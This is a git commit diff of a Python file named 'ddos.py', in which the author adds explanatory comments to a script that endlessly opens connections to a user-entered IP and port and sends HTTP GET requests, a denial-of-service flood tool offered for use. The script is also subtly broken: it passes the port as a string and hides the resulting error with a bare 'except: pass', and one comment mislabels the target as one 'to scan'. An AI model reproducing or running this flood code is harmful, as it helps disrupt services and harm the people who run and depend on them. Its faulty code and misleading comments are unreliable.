1df4c2df9259cc4cc9880ca2c9c3210ed946b091
Hertz <106058099+yuhertz@users.noreply.github.com>
2024-01-30 09:34:24 +0800

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,20 +1,18 @@
-import socket
+import socket # imports the socket module
 
+target_ip = input("Enter target IP Address: ") # the target IP address to scan
+target_port = input("Enter target port: ") # the target port to scan
 
+def ddos_attack(): # defines a function called ddos_attack
+    while True:  # creates an infinite loop
+        try: # tries to execute the following code
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creates a socket object
+            s.connect((target_ip, target_port)) # connects to the target IP address and port
+            s.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n") # sends a GET request to the target IP address and port
+            s.close() # closes the socket object
+        except: # if an exception occurs, the following code is executed
+            pass # does nothing
 
-target_ip = input("Enter target IP Address: ")
-target_port = input("Enter target port: ")
-
-def ddos_attack():
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((target_ip, target_port))
-            s.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
-            s.close()
-        except:
-            pass
-
-ddos_attack()
+ddos_attack() # calls the ddos_attack function
 
 
